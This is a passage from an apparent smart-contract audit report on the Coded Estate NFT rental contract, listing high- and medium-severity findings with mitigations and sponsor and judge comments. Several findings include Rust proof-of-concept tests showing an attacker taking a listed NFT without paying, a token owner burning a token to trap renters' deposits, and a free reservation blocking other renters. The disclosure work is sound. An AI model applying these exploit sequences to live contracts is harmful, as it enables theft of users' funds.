        "Empty contract",
        None,
    ).unwrap();

    // Victim mints a new token
    execute_mint(&mut app, &contract_addr, MINTER, TOKEN_ID);
    // Asserts that token is minted
    assert_eq!(query_token_count(&app, &contract_addr.to_string()), 1);

    // Victim lists token for sale, set auto_approve to true
    let set_list_for_sell_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::SetListForSell { 
        islisted: true, 
        token_id: TOKEN_ID.to_string(), 
        denom: USDC.to_string(), 
        price: 1000, 
        auto_approve: true
    };
    let res = app.execute_contract(
        Addr::unchecked(MINTER),
        contract_addr.clone(),
        &set_list_for_sell_msg,
        &[],
    );
    assert!(res.is_ok());

    // Attacker: give me the monay!
    const ATTACKER: &str = "attacker";
    init_usdc_balance(&mut app, ATTACKER, 1000);
    
    // Attacker bids on victim's token
    let set_bid_to_buy_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::SetBidToBuy { 
        token_id: TOKEN_ID.to_string()
     };
    let res = app.execute_contract(
        Addr::unchecked(ATTACKER),
        contract_addr.clone(),
        &set_bid_to_buy_msg,
        &[Coin {
            denom: USDC.to_string(),
            amount: Uint128::new(1000),
        }],
    );
    assert!(res.is_ok()); // Everything is ok
    
    // Asserts that the token owner is victim (before attacker's exploitation)
    assert_eq!(query_token_owner(&app, &contract_addr.to_string(), TOKEN_ID), MINTER);

    // Instead of using transfer_nft, attacker uses send_nft to bypass the payment
    let send_nft_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::SendNft { 
        contract: empty_contract_addr.to_string(), // attacker-controlled contract
        token_id: TOKEN_ID.to_string(),
        msg: Binary::default()
    };
    let res = app.execute_contract(
        Addr::unchecked(ATTACKER),
        contract_addr.clone(), 
        &send_nft_msg,
        &[],
    );
    assert!(res.is_ok()); // Everything is ok
    
    // Asserts that attacker-controlled contract is now the owner of the token
    assert_eq!(query_token_owner(&app, &contract_addr.to_string(), TOKEN_ID), empty_contract_addr);

    assert_eq!(query_usdc_balance(&app, ATTACKER), 0);
    // Attacker cancels the bid, getting refunded
    let set_bid_to_buy_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::SetBidToBuy { 
        token_id: TOKEN_ID.to_string()
     };
    let res = app.execute_contract(
        Addr::unchecked(ATTACKER),
        contract_addr.clone(),
        &set_bid_to_buy_msg,
        &[],
    );
    assert!(res.is_ok());
    // Asserts that Attacker gets their money back and victim (MINTER) gets nothing
    assert_eq!(query_usdc_balance(&app, ATTACKER), 1000);
    assert_eq!(query_usdc_balance(&app, MINTER), 0);
}

```

1. Run `cargo test h4_bid_and_send_nft -- --nocapture`.
2. Observe that the test passes, indicating that the described scenario is valid.


### Recommended Mitigation


Disallow the use of `send_nft` when token is on sale.


### Assessed type


Context

**blockchainstar12 (Coded Estate) acknowledged**


## [H-09] Token owner can burn their token with active rental leading to renters’ funds being stuck


*Submitted by nnez, also found by Ch_301*

If the property owner calls the `burn` function while active rentals exist, the rental information, including deposits, is deleted. This prevents renters from retrieving their funds through the cancellation process, leading to funds of renters being stuck in the contract.


### Description


The `burn` function in the contract deletes all data associated with a token, including any active rental information. In Coded Estate, renters must deposit funds in advance for short-term rentals, and this information is stored in a vector, `rentals`, linked to the token.

The issue arises because the `burn` function only checks whether the caller is the owner or has approval to burn the token. It does not validate whether there are any active rentals associated with the token. As a result, if the property owner calls the `burn` function while rentals are still active, all rental data, including the deposit amounts, is deleted from storage.

Without the rental information, renters can no longer use the cancellation function to retrieve their deposits, as the contract does not retain any record of the rental. This leads to irreversible loss of funds for the renters.


### Relevant code snippets

```

File: contracts/codedestate/src/state.rs
pub struct TokenInfo<T> {
    /// The owner of the newly minted NFT
    pub owner: Addr,
    pub approvals: Vec<Approval>,
    pub longterm_rental: LongTermRental,
    pub shortterm_rental: ShortTermRental,
    pub rentals: Vec<Rental>,  // <-- rental information is stored here
    pub bids: Vec<Bid>,
    pub sell: Sell,
    pub token_uri: Option<String>,
    pub extension: T,
}

File: contracts/codedestate/src/execute.rs
pub fn setlistforshorttermrental(
    //...
    //... function arguments
    //...
) -> Result<Response<C>, ContractError> {
    ...
    ... snipped
    ...
    let traveler = Rental {
        denom:token.shortterm_rental.denom.clone(),
        rental_type:false,
        approved_date:None,
        deposit_amount: Uint128::from(rent_amount),
        renting_period: vec![new_checkin_timestamp, new_checkout_timestamp],
        address: Some(info.sender.clone()),
        approved: token.shortterm_rental.auto_approve,
        cancelled:false,
        guests:guests,
    };

    // token.shortterm_rental.deposit_amount += sent_amount;
    token
        .rentals
        .insert(placetoreserve as usize, traveler); // deposited amount is stored in rentals vector
    ...
    ... snipped
    ...
}

fn burn(
    &self,
    deps: DepsMut,
    env: Env,
    info: MessageInfo,
    token_id: String,
) -> Result<Response<C>, ContractError> {
    let token = self.tokens.load(deps.storage, &token_id)?;
    self.check_can_send(deps.as_ref(), &env, &info, &token)?; // <-- Only checks ownership or approval

    self.tokens.remove(deps.storage, &token_id)?;  // <-- Deletes all token data including saved rentals vector
    self.decrement_tokens(deps.storage)?;

    Ok(Response::new()
        .add_attribute("action", "burn")
        .add_attribute("sender", info.sender)
        .add_attribute("token_id", token_id))
}

```

### Example Scenario


1. A property owner lists a property for short-term rental, and several renters reserve it by depositing funds in advance.
2. The property owner calls the `burn` function to burn the token while rentals are still active.
3. All rental information, including the deposit amounts, is erased.
4. When renters attempt to cancel their reservations expecting a refund, the transaction will revert as the rental information is deleted with the token.


### Proof-of-Concept


The following test demonstrates that the token owner can burn their token while there is active rental leading to renter’s funds getting stuck in the contract:

Boilerplate for PoC [here](https://gist.github.com/nnez/c76b1a867dd8dc441dbe552e048b796e).

1. Replace everything in `contracts/codedestate/src/multi_tests.rs` with boilerplate from above secret gist.
2. Insert below test:

```

#[test]
fn h1_burn_active_rental() {
    let (mut app, contract_addr) = mock_app_init_contract();

    // Minter mints a new token
    execute_mint(&mut app, &contract_addr, MINTER, TOKEN_ID);
    // Asserts that token is minted
    assert_eq!(query_token_count(&app, &contract_addr.to_string()), 1);
    
    // Minter set list for short term rental
    let list_short_term_rental_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::SetListForShortTermRental { 
        token_id: TOKEN_ID.to_string(), 
        denom: USDC.to_string(), 
        price_per_day: 10, 
        auto_approve: true, 
        available_period: vec![], 
        minimum_stay: 1, 
        cancellation: vec![]
    };
    let res = app.execute_contract(
        Addr::unchecked(MINTER),
        contract_addr.clone(),
        &list_short_term_rental_msg,
        &[],
    );
    assert!(res.is_ok()); // Everyting is ok

    // Traveler makes reservation on minter's property (token)
    init_usdc_balance(&mut app, TRAVELER, 10);
    let tmr = app.block_info().time.plus_days(1);
    let list_short_term_rental_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::SetReservationForShortTerm { 
        token_id: TOKEN_ID.to_string(), 
        renting_period: vec![tmr.seconds().to_string(), tmr.plus_days(1).seconds().to_string()], 
        guests: 1
    };
    let res = app.execute_contract(
        Addr::unchecked(TRAVELER),
        contract_addr.clone(),
        &list_short_term_rental_msg,
        &vec![Coin {
            denom: USDC.to_string(),
            amount: Uint128::new(10),
        }],
    );
    assert!(res.is_ok()); // Everything is ok
    // 10 USDC is deposited into the contract from Traveler
    assert_eq!(query_usdc_balance(&app, &contract_addr.to_string()), 10);

    
    // Minter burns the token while there is active rental from traveler
    let burn_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::Burn { 
        token_id: TOKEN_ID.to_string() 
    };
    let res = app.execute_contract(
        Addr::unchecked(MINTER),
        contract_addr.clone(),
        &burn_msg,
        &[],
    );
    assert!(res.is_ok()); // Minter successfully burns the token whiel there is active rental
    
    // Funds are stuck in contract
    assert_eq!(query_usdc_balance(&app, &contract_addr.to_string()), 10);
    assert_eq!(query_usdc_balance(&app, &TRAVELER.to_string()), 0);
    assert_eq!(query_usdc_balance(&app, &MINTER.to_string()), 0);
    
    // Token is burnt
    assert_eq!(query_token_count(&app, &contract_addr.to_string()), 0);

    // Funds are also not collected as fees
    assert_eq!(query_fee_balance(&app, &contract_addr.to_string()), 0);
}

```

1. Run `cargo test h1_burn_active_rental -- --nocapture`.
2. Observe that the test passes.


### Recommended Mitigation


Add a validation in `burn` function that there is no active rental.


### Assessed type


Invalid Validation

**blockchainstar12 (Coded Estate) confirmed**


# Medium Risk Findings (9)



## [M-01]  Malicious NFT owners can rug the reservation of the long-term


*Submitted by Ch_301, also found by nnez*

[https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/execute.rs#L1490-L1541](https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/execute.rs#L1490-L1541)

[https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/execute.rs#L1786-L1854](https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/execute.rs#L1786-L1854)


### Description


Due to the long period of the long-term rent, the Homeowner has an advantage in that type of reservation, which is the ability to withdraw a part from the deposited amount by the tenant. This applies only to reservations made more than one month in advance. This could be done by using `execute.rs#withdrawtolandlord()` function.

```

if item.deposit_amount - Uint128::from(token.longterm_rental.price_per_month) < Uint128::from(amount)  {

```

The withdrawn amount will be subtracted from the user’s `deposit_amount` state:

```

token.rentals[position as usize].deposit_amount -= Uint128::from(amount);

```

On the other side, the NFT owner can trigger `execute.rs#rejectreservationforlongterm()` to reject any reservation at any time even if it currently running, it will send back `.deposit_amount` as a refundable amount to the user.

However, a malicious homeowner can the advantages of `execute.rs#rejectreservationforlongterm()` and `execute.rs#withdrawtolandlord()` to steal a user’s funds and reject them in two simple steps:

1. Wait for the reservation to start and call `execute.rs#withdrawtolandlord()`. this will transfer most of the funds out.
2. Now, invoke `execute.rs#rejectreservationforlongterm()` to kick the user out, this will transfer back to the user only a small presenting of his initial deposit.

Note: The homeowner has the power to reject any reservation even if it is currently active by triggering `rejectreservationforlongterm()` and refunding user money; however, using this function, the refundable amount is the same initial deposit.


### Recommended Mitigation Steps


Don’t allow to reject active reservations.

**blockchainstar12 (Coded Estate) acknowledged and commented:**

Actually, the platform will work as monthly deposit logic and this won’t be issue.


## [M-02] Users can’t cancel reservation due to out-of-gas


*Submitted by Ch_301, also found by nnez*

In `execute.rs#cancelreservationafterapprovalforshortterm` and `execute.rs#cancelreservationafterapprovalforlongterm()` , multiple iterations occur over the `cancellation` vector, which may cause the transaction to fail due to an out-of-gas error.

Consequently, malicious NFT owners could exploit this by setting a big list inside the `cancellation` vector by invoking `execute.rs#setlistforshorttermrental()` or  `execute.rs#setlistforlongtermrental()`:

```

    pub fn setlistforlongtermrental(
    /***CODE***/
        cancellation: Vec<CancellationItem>,
    ) -> Result<Response<C>, ContractError> {
/***CODE***/
token.longterm_rental.cancellation = cancellation;

```

This will force the cancellation of the reservation to fail due to gas limits.


### Recommended Mitigation Steps


Set a cap for the length of the `cancellation` vector that owners can set it.

**blockchainstar12 (Coded Estate) acknowledged and commented:**

Nobody sets cancellation array, as such big list and such transaction cannot be confirmed.


## [M-03] Use of u64 for price_per_day and price_per_month limits handling tokens with 18 decimals


*Submitted by nnez*

[https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/msg.rs#L168](https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/msg.rs#L168)

[https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/msg.rs#L111](https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/msg.rs#L111)


### Impact


The use of `u64` for `price_per_day` and `price_per_month` prevents setting rental prices higher than approximately 18 tokens when using tokens with 18 decimals, potentially restricting landlords from setting appropriate rental prices in tokens with 18 decimals.


### Proof-of-Concept


The `SetListForShortTermRental` and `SetListForLongTermRental` enums in the contract use `u64` for `price_per_day` and `price_per_month` respectively, while the corresponding functions, `setlistforshorttermrental` and `setlistforlongtermrental`, also define these prices as `u64`.

```

File: contracts/codedestate/src/msg.rs
pub enum ExecuteMsg<T, E> {
    SetListForShortTermRental {
        token_id: String,
        denom: String,
        price_per_day: u64, // <-- here
        auto_approve: bool,
        available_period: Vec<String>,
        minimum_stay: u64,
        cancellation: Vec<CancellationItem>,
    },
    SetListForLongTermRental {
        token_id: String,
        denom: String,
        price_per_month: u64, // <-- here
        auto_approve: bool,
        available_period: Vec<String>,
        minimum_stay: u64,
        cancellation: Vec<CancellationItem>,
    },
}

File: contracts/codedestate/src/execute.rs
pub fn setlistforshorttermrental(
    &self,
    deps: DepsMut,
    env: Env,
    info: MessageInfo,
    token_id: String,
    denom: String,
    price_per_day: u64, // <--
    auto_approve: bool,
    available_period: Vec<String>,
    minimum_stay:u64,
    cancellation:Vec<CancellationItem>,
) -> Result<Response<C>, ContractError> {... snipped ...}

pub fn setlistforlongtermrental(
    &self,
    deps: DepsMut,
    env: Env,
    info: MessageInfo,
    token_id: String,
    denom: String,
    price_per_month: u64, // <--
    auto_approve: bool,
    available_period: Vec<String>,
    minimum_stay: u64,
    cancellation: Vec<CancellationItem>,
) -> Result<Response<C>, ContractError> {... snipped ...}

```

This poses a problem when dealing with tokens with 18 decimals, as the maximum value `u64` can store is approximately `1.8446744e+19`. In contrast, `u128`, which is used elsewhere in the contract for handling token amounts (e.g., `info.funds[0].amount`), can accommodate much larger values, fully supporting tokens with 18 decimals.

This mismatch can create issues when landlords attempt to specify rental prices. For example, when a token is worth `$1` (with 18 decimals), the maximum price that can be set per day or month is capped at approximately 18 tokens `~ $18`, potentially preventing landlords from setting appropriate rental prices for their properties.

Additionally, since Nibiru chain, the deployment chain for Coded Estate, supports custom denominated tokens, landlords may select tokens with 18 decimals as their payment token.

See [here](https://github.com/NibiruChain/nibiru/blob/main/x/tokenfactory/keeper/msg_server.go#L18-L41).


### Example Scenario:


1. A landlord want to list their property on Coded Estate with a rental price of 20 tokens per day (`20e18`).
2. The payment token used has 18 decimals.
3. Since the rental price exceeds the `u64` limit (`2e19 > 1.8446744e+19`), the landlord cannot list the property at the desired price.


### Recommended Mitigations


Change from type `u64` to `u128` instead.


### Assessed type


Context

**Lambda (judge) commented:**

This can indeed limit the functionality of the protocol under reasonable assumptions. 18 decimal stablecoins are very common and it can be expected that some bridged asset will have 18 decimals. In such scenarios, a maximum price of `$18` per month or day will be too low for many properties, meaning that these tokens cannot be used.

**blockchainstar12 (Coded Estate) acknowledged and commented:**

We use tokens with 6 decimals in the platform.


## [M-04] Incorrect use of u64 for arg amount in withdrawtolandlord can cause withdrawal failure


*Submitted by nnez*

[https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/execute.rs#L1786-L1796](https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/execute.rs#L1786-L1796)

[https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/msg.rs#L156-L162](https://github.com/code-423n4/2024-10-coded-estate/blob/main/contracts/codedestate/src/msg.rs#L156-L162)


### Impact


The use of `u64` for token amount in the `withdrawtolandlord` function can lead to failed withdrawals when handling tokens with 18 decimals, limiting the landlord’s ability to withdraw their entitled funds if the amount exceeds the maximum value of `u64`.


### Proof-of-Concept


In the `withdrawtolandlord` function, the token amount is defined as a `u64` value. However, this can cause issues when handling tokens with 18 decimals, as the `u64` data type can only store values up to approximately `1.8446744e+19` `~18` token of token with 18 decimals. This limit is significantly lower than what is supported by `u128`, which is used in other parts of the contract to handle token amount, such as `info.funds[0].amount` is a `U128` type.

```

File: contracts/codedestate/src/execute.rs
pub fn withdrawtolandlord(
    &self,
    deps: DepsMut,
    env: Env,
    info: MessageInfo,
    token_id: String,
    tenant: String,
    renting_period: Vec<String>,
    amount:u64,
    address:String
) -> Result<Response<C>, ContractError> { ... snipped ...}

File: contracts/codedestate/src/msg.rs
pub enum ExecuteMsg<T, E> {
    ...snipped...
    ...
    WithdrawToLandlord {
        token_id: String,
        tenant: String,
        renting_period: Vec<String>,
        amount: u64,
        address: String,
    },
    ...snipped...
    ...

```

This discrepancy between the data types can create an issue. If the token amount owed to the landlord exceeds the maximum value supported by `u64`, the landlord will not be able to withdraw their entitled funds through the `withdrawtolandlord` function.

This is problematic as the Nibiru chain, the chain on which Coded Estate is deployed, supports custom denominated tokens, and users can specify tokens with 18 decimals as their payment currency. For example, if a large payment is made in such a token, the landlord would be unable to withdraw the full amount due to the limitations of the `u64` type.

See [here](https://github.com/NibiruChain/nibiru/blob/main/x/tokenfactory/keeper/msg_server.go#L18-L41).


### Example Scenario:


1. A user pays deposit using a token with 18 decimals.
2. The total deposit amount exceeds the maximum value of `u64` (`~18` tokens for 18-decimal tokens).
3. When the landlord tries to withdraw their funds via the `withdrawtolandlord` function, the function fails because the `u64` type cannot accommodate the large token amount.
4. As a result, the landlord is unable to withdraw their funds, leading to loss of access to legitimate payments.


### Recommended Mitigation


Change type of `amount` to `u128` for consistency with other parts in the system.


### Assessed type


Context

**Lambda (judge) commented:**

Does not seem to be a significant problem to me at first sight, if such a scenario would ever happen, withdrawal should be possible with multiple calls.

**blockchainstar12 (Coded Estate) acknowledged**

**Lambda (judge) decreased severity to Low and commented:**

Unlike [#29](https://github.com/code-423n4/2024-10-coded-estate-findings/issues/29), this does not impact the functionality of the protocol significantly. While a larger data type could still be a good idea here, the owner can still withdraw funds by splitting up the withdrawals into multiple calls.

**nnez (warden) commented:**

@Lambda - I might have overstated the impact in the report (unable to withdraw funds). However, I still believe that this issue should be classified as Medium severity. This bug does impact the protocol’s functionality.  

Consider the scenario wherein the required deposit is `5_000e18` tokens. In this scenario, the token owner would have to split their transaction into `5_000e18 / (2^64-1) = 271.05 → 272` separate transactions in order to withdraw all the funds.  

That’s a lot of transactions and this is just for one long-term rental. An individual token owner’s can have more than one property and they can have more than one active long-term rental with deposit to withdraw.  

Instead of paying gas for one transaction, users unnecessarily have to pay `200x+` more of gas in order to withdraw the full amount.  

Additionally, `5_000e18` is just an arbitrary reasonable number for a 18 decimals token worth `$1`; the problem could get worse with a larger amount of tokens. For example, `50_000e18 of $0.1` would take 2711 transactions to withdraw the full amount.  

**Lambda (judge) increased severity to Medium and commented:**

That’s true, `$5,000` is a reasonable amount for such a protocol to handle. Potentially even low, with business apartments in cities like Zurich that often cost `$5,000` per month, so you could easily have `$30,000` for a longer rental. 18 decimal stable coins are also very common.

So it is not that unlikely that a landlord would have to perform `~1,632` calls for one withdrawal. On the one hand, this would be of course very cumbersome (especially if the UI did not support this), but it can also become pretty expensive (if one call were roughly `$1`, this would be an almost 5% fee on top). So based on that, Medium is indeed more appropriate.


## [M-05] Incorrect refund amount is sent  to the tenant if long term reservation is cancelled after approval


*Submitted by adeolu, also found by adeolu*

`token.longterm_rental.cancellation.percentage` is not deducted from the `token.longterm_rental.deposit_amount` and refunded back to the user as expected after a `cancelreservationafterapprovalforlongterm()` call to cancel a reservation that has been approved.


### Proof Of Concept


[https://github.com/code-423n4/2024-10-coded-estate/blob/97efb35fd3734676f33598e6dff70119e41c7032/contracts/codedestate/src/execute.rs#L1647-L1683](https://github.com/code-423n4/2024-10-coded-estate/blob/97efb35fd3734676f33598e6dff70119e41c7032/contracts/codedestate/src/execute.rs#L1647-L1683)

```

    pub fn cancelreservationafterapprovalforlongterm(
        &self,
        deps: DepsMut,
        info: MessageInfo,
        token_id: String,
        renting_period: Vec<String>
    ) -> Result<Response<C>, ContractError> {
        let mut token = self.tokens.load(deps.storage, &token_id)?;

        let mut position: i32 = -1;
        // let mut amount = Uint128::from(0u64);
        // let tenant_address = info.sender.to_string();
        for (i, item) in token.rentals.iter().enumerate() {
            if item.address == Some(info.sender.clone()) && item.renting_period[0].to_string() == renting_period[0]
            && item.renting_period[1].to_string() == renting_period[1]
             {
                if item.approved_date.is_none() {
                    return Err(ContractError::NotApproved {});
                } else {
                    position = i as i32;
                    // amount = item.deposit_amount;
                }
            }
        }

        if position != -1 {
            // token.rentals.remove(position as usize);
            token.rentals[position as usize].cancelled = true;
            self.tokens.save(deps.storage, &token_id, &token)?;
            Ok(Response::new()
            .add_attribute("action", "cancelreservationafterapprovalforlongterm")
            .add_attribute("sender", info.sender)
            .add_attribute("token_id", token_id))
        } else {
            return Err(ContractError::NotReserved {});
        }
    }

```

In `cancelreservationafterapprovalforlongterm()` we can see how no money is refunded to the tenant after cancellation is made after approval. The function does not calculate the refundable amount incase of a cancellation by tenant after approval like it is done in `cancelreservationafterapprovalforshortterm()`. See [here](https://github.com/code-423n4/2024-10-coded-estate/blob/97efb35fd3734676f33598e6dff70119e41c7032/contracts/codedestate/src/execute.rs#L1083-L1112).

A landlord can set that cancellations after approval will happen with a 90% refund via `setlistforlongtermrental()`, where the `token.longterm_rental.cancellation.percentage` will be set to 90. But this will never be enforced in the `cancelreservationafterapprovalforlongterm()` code. The function will never refund but instead cancel the reservation with no refund processed to the tenant. This is against the intention of the landlord/token owner because token owner set the `token.longterm_rental.cancellation.percentage` to be 90% and so 90% of the deposit amount should be refunded to the tenant that cancelled.

In `finalizelongtermrental()`, since `item.cancelled` has been set to true, the iteration logic there tries to deduct a fee percentage from the amount, but this amount is not the `token.longterm_rental.cancellation.percentage` set by the token owner. Instead it is the `fee_percentage` for the protocol which only the contract owner can set via `set_fee_value()`.

[https://github.com/code-423n4/2024-10-coded-estate/blob/97efb35fd3734676f33598e6dff70119e41c7032/contracts/codedestate/src/execute.rs#L1727-L1731](https://github.com/code-423n4/2024-10-coded-estate/blob/97efb35fd3734676f33598e6dff70119e41c7032/contracts/codedestate/src/execute.rs#L1727-L1731)

```

                if item.cancelled {

                    ....

                    let fee_percentage = self.get_fee(deps.storage)?;
                    self.increase_balance(deps.storage, token.longterm_rental.denom.clone(), Uint128::new((u128::from(amount) * u128::from(fee_percentage)) / 10000))?;
                    //@audit  why increase it again here? money isn't sent in  

                    amount -= Uint128::new((u128::from(amount) * u128::from(fee_percentage)) / 10000);

```

The use of `self.get_fee(deps.storage)` instead of `token.longterm_rental.cancellation.percentage` means that the cancellation penalty specified by the token owner to be enforced on cancellations after approvals will not happen.


### Recommended Mitigation


Use `token.longterm_rental.cancellation.percentage` to calculate amount to be returned to tenant instead of `self.get_fee(deps.storage)` if the deduction will be enforced in `finalizelongtermrental()`.

*OR* 

Add extra logic like below into `cancelreservationafterapprovalforlongterm()` to check that refundable amount is calculated as directed by the landlord/token owner.

```

            let mut cancellation = token.longterm_rental.cancellation.clone();

            .....

            let diff_days = (check_in_time_timestamp - current_time)/86400;
            for (_i, item) in cancellation.iter().enumerate() {
                if item.deadline < diff_days {
                    refundable_amount =  Uint128::new((amount.u128() * u128::from(item.percentage)) / 100);
                    break;
                }
            }

           .....

                     if refundable_amount > Uint128::new(0) {
                    Ok(Response::new()
                    .add_attribute("action", "cancelreservationafterapprovalforlongterm")
                    .add_attribute("sender", info.sender)
                    .add_attribute("token_id", token_id)
                    .add_message(BankMsg::Send {
                        to_address: traveler_address,
                        amount: vec![Coin {
                            denom: token.longterm_rental.denom,
                            amount: refundable_amount,
                        }],
                    }))
                }

```

### Assessed type


Context

**blockchainstar12 (Coded Estate) acknowledged and commented:**

This is intended logic.

**Lambda (judge) decreased severity to Medium and commented:**

I agree that it seems weird that the `cancellation` vector for long term rentals is completely ignored. While this seems to be intended according to the sponsor, I have not found any documentation indicating this and an owner may therefore, have different expectations. Because of this, I am judging it as impact on the function of the protocol / value leak with external requirements (assumptions about the long-term cancellation process).


## [M-06] Lack of upfront cost for long-term reservations allows fake reservations, blocking real users


*Submitted by nnez*

This issue allows a malicious actor to reserve long-term rentals without upfront payment, making large time slots unavailable for other potential renters. It creates an unfair scenario where legitimate users are blocked out from booking, as the property becomes unavailable for both short-term and long-term rentals during the reserved period. This could lead to decreased revenue for property owners.


### Description


The `setreservationforlongterm` function allows users to reserve long-term rentals without any upfront payment. Once a reservation is made, the reserved period is marked as unavailable, blocking other users from reserving the same property during that period for either long-term or short-term rentals.

```

pub fn setreservationforlongterm(
    &self,
    deps: DepsMut,
    info: MessageInfo,
    token_id: String,
    renting_period: Vec<String>,
    guests:usize,
) -> Result<Response<C>, ContractError> {
    let mut token = self.tokens.load(deps.storage, &token_id)?;
    let new_checkin = renting_period[0].parse::<u64>();
    let new_checkin_timestamp;

    match new_checkin {
        Ok(timestamp) => {
            new_checkin_timestamp = timestamp;
        }
        Err(_e) => {
            return Err(ContractError::NotReserved {});
        }
    }
    let new_checkout = renting_period[1].parse::<u64>();
    let new_checkout_timestamp;

    match new_checkout {
        Ok(timestamp) => {
            new_checkout_timestamp = timestamp;
        }
        Err(_e) => {
            return Err(ContractError::NotReserved {});
        }
    }

    if ((new_checkout_timestamp - new_checkin_timestamp)/ 86400) < token.longterm_rental.minimum_stay {
        return Err(ContractError::LessThanMinimum {});
    }

    let mut placetoreserve: i32 = -1;
    let lenofrentals = token.rentals.len();

    let mut flag = false;
    // @c4-contest: if the renting period overlap with an existing rental, the placetoreserve will be -1
    for (i, tenant) in token.rentals.iter().enumerate() {
        let checkin = tenant.renting_period[0];
        let checkout = tenant.renting_period[1];
        if new_checkout_timestamp < checkin {
            if i == 0 {
                placetoreserve = 0;
                break;
            } else if flag {
                placetoreserve = i as i32;
                break;
            }
        } else if checkout < new_checkin_timestamp {
            flag = true;
            if i == lenofrentals - 1 {
                placetoreserve = lenofrentals as i32;
                break;
            }
        } else {
            flag = false;
        }
    }

    if placetoreserve == -1 {
        if lenofrentals > 0 {
            return Err(ContractError::UnavailablePeriod {});
        } else {
            placetoreserve = 0;
        }
    }

    let tenant = Rental {
        denom:token.longterm_rental.denom.clone(),
        rental_type:true,
        approved:token.longterm_rental.auto_approve,
        deposit_amount: Uint128::from(0u64), // @c4-contest: no upfront payment required
        renting_period: vec![new_checkin_timestamp, new_checkout_timestamp],
        address: Some(info.sender.clone()),
        approved_date: None,
        cancelled:false,
        guests,
    };

    token
        .rentals
        .insert(placetoreserve as usize, tenant);

    self.tokens.save(deps.storage, &token_id, &token)?;
        Ok(Response::new()
            .add_attribute("action", "setreservationforlongterm")
            .add_attribute("sender", info.sender)
            .add_attribute("token_id", token_id))
}

```

This lack of an upfront cost creates an opening for abuse. A malicious actor could spam the system by making multiple long-term reservations across various periods for a property, essentially making all time slots unavailable. By doing so, legitimate users are blocked from renting the property, potentially causing financial harm to the property owner.

Even though property owners can reject these reservations manually, they cannot easily distinguish between legitimate and fake reservations. The actor could use multiple addresses to make the fake reservations appear legitimate. This forces the owner to either wait for a deposit via `depositforlongtermrental` or communicate with the renter through other channels (like messaging) to verify if the booking is genuine.

The key issue here is that all of these actions involve a wait time, during which legitimate renters might lose interest and book other properties. This wait time represents an opportunity cost, reducing the property’s chances of being rented by honest users. The inability to distinguish between genuine and fake reservations, combined with the opportunity cost, makes this finding valid and harmful to the system’s integrity.


### Example Scenario:


1. A malicious user reserves multiple periods for a popular property using different addresses, without any upfront payment.
2. Legitimate users attempt to reserve the property but are blocked because the periods are marked as unavailable.
3. The property owner is forced to wait for the malicious user to make a deposit or use external communication to verify the reservation, leading to lost rental opportunities as honest users may move on to other properties.


### Proof-of-Concept


The following test demonstrates that attacker can make a reservation for long-term rental with no cost and honest renter cannot reserve an unavailable slot made by attacker:

Boilerplate for PoC [here](https://gist.github.com/nnez/c76b1a867dd8dc441dbe552e048b796e).

1. Replace everything in `contracts/codedestate/src/multi_tests.rs` with boilerplate from above secret gist.
2. Insert below test:

```

#[test]
fn m2_long_term_rental_denial_of_service(){
    let (mut app, contract_addr) = mock_app_init_contract();
    
    // Minter mints a new token
    execute_mint(&mut app, &contract_addr, MINTER, TOKEN_ID);

    // Minter lists token for long-term rental
    let list_long_term_rental_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::SetListForLongTermRental { 
        token_id: TOKEN_ID.to_string(),
        denom: USDC.to_string(),
        price_per_month: 1000,
        auto_approve: true,
        available_period: vec![0.to_string(),1640995200.to_string()], // 1 year availability
        minimum_stay: 0,
        cancellation: vec![],
    };
    let res = app.execute_contract(
        Addr::unchecked(MINTER), 
        contract_addr.clone(), 
        &list_long_term_rental_msg, 
        &[]
    );
    assert!(res.is_ok()); // Everything is ok

    const ATTACKER: &str = "attacker";
    // Asserts that Attacker has no prior balance
    assert_eq!(query_usdc_balance(&app, ATTACKER), 0);
    // Attacker makes a reservation over multiple span of renting periods
    let reserve_long_term_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::SetReservationForLongTerm { 
        token_id: TOKEN_ID.to_string(),
        renting_period: vec![1.to_string(), 1928640800.to_string()],
        guests: 1,
    };
    let res = app.execute_contract(
        Addr::unchecked(ATTACKER), 
        contract_addr.clone(), 
        &reserve_long_term_msg, 
        &[]
    );
    assert!(res.is_ok()); // Everything is ok

    const RENTER: &str = "renter";
    // Honest renter tries to make a reservation for 7-12-2024 10:00 to 11-12-2024 10:00
    let reserve_long_term_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::SetReservationForLongTerm { 
        token_id: TOKEN_ID.to_string(),
        renting_period: vec![1728295200.to_string(), 1728640800.to_string()],
        guests: 1,
    };
    let res = app.execute_contract(
        Addr::unchecked(RENTER), 
        contract_addr.clone(), 
        &reserve_long_term_msg, 
        &[]
    );
    // The transaction fails from Unavailable Period as it's already reserved for Attacker
    println!("{:?}", res);

}

```

1. Run `cargo test m2_long_term_rental_denial_of_service -- --nocapture`.
2. Observe that honest renter’s transaction fails from unavailable period made by attacker.


### Recommended Mitigation


Consider requiring some amount of upfront payment for long-term rental reservation with cancellation policy as already implemented in short-term rental flow.


### Assessed type


Context

**Lambda (judge) commented:**

